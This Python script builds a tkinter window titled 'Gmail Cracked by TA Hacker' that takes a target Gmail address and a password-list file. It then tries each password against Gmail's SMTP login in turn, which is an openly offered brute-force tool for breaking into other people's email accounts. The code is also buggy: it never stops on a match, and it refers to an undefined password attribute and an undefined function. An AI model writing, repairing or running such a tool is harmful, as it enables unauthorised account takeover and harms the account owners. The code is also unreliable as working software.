from tkinter import *
from tkinter.messagebox import showinfo , showerror
import smtplib
smtpserver = smtplib.SMTP_SSL()
smtp_host = 'smtp.gmail.com'
smtp_port = 465
smtpserver = smtplib.SMTP_SSL()
smtpserver.connect(smtp_host, smtp_port)
# smtpserver.ehlo()
# smtpserver.starttls()
smtpserver.ehlo
class Login ( Tk ):
    '''Here the Login window appears and receives data from:
        - Email account.
        - Password.
        Furthermore, tries to log in to your gmail account.'''

    def __init__(self):
        try:
            self.gmail = smtplib.SMTP ( "smtp.gmail.com" , 587 )
        except Exception as e:
            showerror ( "Fatal Error" , str ( e ) )
            exit ( )
        Tk.__init__ ( self )
        # self.geometry("268x157")
        self.resizable ( 0 , 0 )
        self.title ( "Gmail Cracked by TA Hacker " )
        self.config ( bg="black" )

        me = StringVar ( )
        mp = StringVar ( )
        Label ( self , text="Target Gmail account:" , bg="black" , fg="green" ).grid ( row=0 , column=0 , sticky=W )
        self.my_email = Entry ( self , textvariable=me , width=25 )
        self.my_email.grid ( row=0 , column=1 )

        Label ( self , text="List Password:" , bg="black" , fg="green" ).grid ( row=1 , column=0 , sticky=W )
        self.my_passw = Entry ( self , textvariable=mp , width=25 )
        self.my_passw.grid ( row=1 , column=1 )

        self.email_button = Button ( self , text="Enter" , command=self.login_gmail , bg="black" , fg="green" )
        self.email_button.grid ( row=3 , column=0 , sticky=NSEW )

        salir = Button ( self , text="Exit" , command=self.quit , bg="black" , fg="red" )
        salir.grid ( row=3 , column=1 , sticky=NSEW )


    def login_gmail(self):
        account = self.my_email.get ( )
        passs = self.my_passw.get()
        open(passs).read().splitlines()

        self.gmail.ehlo ( )
        self.gmail.starttls ( )

        for passs in open(passs):
            try:
                self.gmail.login ( account , passs)

                print ( "[+] password found :%s" % passs)

            except smtplib.SMTPAuthenticationError:
                print ( "[!] password incorrect :%s" % passs )
        try:
                self.gmail.login ( account , self.password )
                showinfo ( "Success" , "You are now logged in Gmail." )
        except:

                exit ( )
        gmail = self.gmail
        newEmail ( gmail , account )
        self.withdraw ( )


L = Login ( )
L.mainloop ( )
